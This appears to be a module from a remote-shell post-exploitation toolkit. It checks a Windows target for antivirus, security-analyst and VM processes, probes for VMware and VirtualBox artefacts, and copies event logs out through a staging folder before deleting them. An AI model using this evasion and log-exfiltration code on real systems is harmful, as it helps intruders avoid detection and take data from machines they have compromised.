#!/usr/bin/python3
import logging
from termcolor import cprint

from modules.av.av_procs import av_procs
from modules.av.opsec_procs import opsec_procs
from modules.av.vm_procs import vm_processes


def check_av(self, s):
    try:
        buf, err = self.get_process_list()
        for proc in av_procs:
            if proc in buf:
                print(proc)
        self.out_clear()
    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))


def security_tools(self, s):
    logging.info("Security Researcher Tools: ")
    count = 0
    buf, err = self.get_process_list()
    for i in opsec_procs:
        if i in buf:
            print(i)
            count += 1
    self.out_clear()
    if count == 0:
        logging.info("No Security Researcher Processes Found")


def vm(self, s):
    try:
        logging.info("Common Processes: ")
        count = 0
        buf, err = self.get_process_list()
        for i in vm_processes:
            if i in buf:
                print(i)
                count += 1
        self.out_clear()
        if count == 0:
            logging.info("No VM Processes found")

        self.execute_remote(r'dir /B "C:\Program Files\VMware"')
        buf = (self.out or '').strip('\r\n')
        if "File Not Found" in buf:
            print(r"C:\Program Files\VMware Not Present")
            self.out_clear()
        else:
            self.out_clear()
            cprint(r'C:\Program Files\VMWare found', "red")
        self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
        self.format_print_buff()

        logging.info("Virtual Box Detection")
        self.execute_remote(
            r'if exist "%SystemRoot%\System32\drivers\VBoxMouse.sys"  (echo VBoxMouse.sys) & '
            r'if exist "%SystemRoot%\System32\drivers\VBoxGuest.sys"  (echo VBoxGuest.sys)'
        )

        buf = (self.out or "").replace("\r", "").strip()
        hits = [line for line in buf.split("\n") if line]

        if hits:
            print("[!] Found VBox files:")
            for h in hits:
                cprint(h, "red")
        else:
            print("[*] No VirtualBox files found")

        self.out_clear()

    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", e)


def log_grab(self, s):
    try:
        prefix = 'copy '
        log_file_name = s
        file_path = r'C:\Windows\System32\Winevt\Logs' + '\\'
        remote_copy = r' C:\Windows\system32\spool\drivers\color'
        combined_command = prefix + '"' + file_path + s + '"' + remote_copy
        self.execute_remote(combined_command)
        logging.info(s)
        self.do_lget(remote_copy.lstrip() + '\\' + s)
        self.execute_remote("del" + remote_copy + '\\' + s)
        self.format_print_buff()
    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
